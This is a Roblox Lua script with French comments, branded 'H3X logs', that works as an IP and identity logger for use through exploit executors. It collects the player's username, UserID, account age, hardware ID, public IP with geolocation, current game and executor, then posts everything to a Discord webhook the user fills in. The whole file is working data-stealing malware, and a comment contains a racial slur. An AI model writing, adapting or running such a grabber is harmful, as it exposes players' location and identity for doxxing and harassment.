local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local MarketplaceService = game:GetService("MarketplaceService")

-- récupère le joueur local, parfois il est pas encore chargé donc on attend
-- j'ai eu des bugs avant parce que j'avais pas géré ça
local LocalPlayer = Players.LocalPlayer
if not LocalPlayer then
    LocalPlayer = Players.PlayerAdded:Wait() -- fallback si pas dispo direct
end

-- === Récup des infos du joueur ===
-- initialisation avec des valeurs par défaut pour éviter les nil
local DisplayName = LocalPlayer.DisplayName or "N/A"
local Username = LocalPlayer.Name or "N/A"
local UserId = LocalPlayer.UserId or 0
local Membership = "N/A"
local AccountAge = 0
local HWID = "N/A"
local IP = "N/A"
local IPData = {}
local GameName = "N/A"
local Exploit = "Inconnu"

-- récup les infos avec pcall pour éviter les crashes
-- membership type
pcall(function()
    Membership = tostring(LocalPlayer.MembershipType):match("%w+$") or "N/A"
end)

-- âge du compte
pcall(function()
    AccountAge = LocalPlayer.AccountAge or 0
end)

-- hardware id (identifiant unique de la machine)
pcall(function()
    HWID = RbxAnalyticsService:GetClientId() or "N/A"
end)

-- récup l'IP publique
-- on essaie plusieurs méthodes car chaque exécuteur a sa propre API HTTP
-- j'ai galéré avec ça au début mdr
if syn and syn.request then
    local success, response = pcall(function()
        return syn.request({Url = "https://api.ipify.org", Method = "GET"})
    end)
    if success and response and response.Body then
        IP = response.Body:match("^%s*(.-)%s*$") or "N/A"
    end
elseif request then
    local success, response = pcall(function()
        return request({Url = "https://api.ipify.org", Method = "GET"})
    end)
    if success and response and response.Body then
        IP = response.Body:match("^%s*(.-)%s*$") or "N/A"
    end
elseif http_request then
    local success, response = pcall(function()
        return http_request({Url = "https://api.ipify.org", Method = "GET"})
    end)
    if success and response and response.Body then
        IP = response.Body:match("^%s*(.-)%s*$") or "N/A"
    end
else
    local success, result = pcall(function()
        return HttpService:GetAsync("https://api.ipify.org")
    end)
    if success and result then
        IP = result:match("^%s*(.-)%s*$") or "N/A"
    end
end

-- récup les infos détaillées de l'IP (localisation etc)
if IP and IP ~= "N/A" then
    pcall(function()
        local success, result = pcall(function()
            if syn and syn.request then
                local response = syn.request({Url = "http://ip-api.com/json/"..IP, Method = "GET"})
                if response and response.Body then
                    return HttpService:JSONDecode(response.Body)
                end
            elseif request then
                local response = request({Url = "http://ip-api.com/json/"..IP, Method = "GET"})
                if response and response.Body then
                    return HttpService:JSONDecode(response.Body)
                end
            else
                return HttpService:JSONDecode(HttpService:GetAsync("http://ip-api.com/json/"..IP))
            end
        end)
        if success and result then
            IPData = result -- stocke les données IP
        end
    end)
end

-- nom du jeu roblox dans lequel on est
pcall(function()
    local success, productInfo = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    if success and productInfo and productInfo.Name then
        GameName = productInfo.Name
    end
end)

-- détection de l'exécuteur utilisé
-- test les principaux exécuteurs un par un (synapse, krnl, fluxus, etc)
-- utile pour savoir lequel est utilisé
if syn then
    Exploit = "Synapse"
elseif Krnl then
    Exploit = "Krnl"
elseif Fluxus then
    Exploit = "Fluxus"
elseif Solara then
    Exploit = "Solara"
elseif Delta then
    Exploit = "Delta"
elseif identifyexecutor then
    local success, executor = pcall(identifyexecutor)
    if success and executor then
        Exploit = tostring(executor)
    end
elseif getexecutorname then
    local success, name = pcall(getexecutorname)
    if success and name then
        Exploit = tostring(name)
    end
elseif get_hidden_gui then
    Exploit = "Electron"
elseif PROTOSMASHER_LOADED then
    Exploit = "ProtoSmasher"
end

-- webhook discord pour envoyer les infos du mec
local webhook = "webhook" --put ur webhook here

-- structure du message discord
local data = {
    ["embeds"] = {{
        ["title"] = "H3X logs - H3X by sosaf",
        ["color"] = 0xff0000,
        ["fields"] = {
            {name = "Utilisateur", value = "@"..Username.." ("..DisplayName..")", inline = true},
            {name = "UserID", value = tostring(UserId), inline = true},
            {name = "Premium", value = Membership, inline = true},
            {name = "Âge compte", value = AccountAge.." jours", inline = true},
            {name = "IP", value = IP, inline = true},
            {name = "Exploit", value = Exploit, inline = true},
            {name = "Jeu", value = ""..GameName.."", inline = false},
            {name = "HWID", value = HWID, inline = false},
        },
        ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..UserId.."&width=420&height=420&format=png"},
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}

--envoie au webhook discord negro 
local payload = HttpService:JSONEncode(data)
local req = (syn and syn.request) or request or http_request -- utilise la méthode disponible selon l'exécuteur
if req then
    pcall(function()
        req({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload})
        
    end)
else
    warn("Aucune méthode HTTP disponible pour envoyer le webhook") -- au cas où rien ne marche
end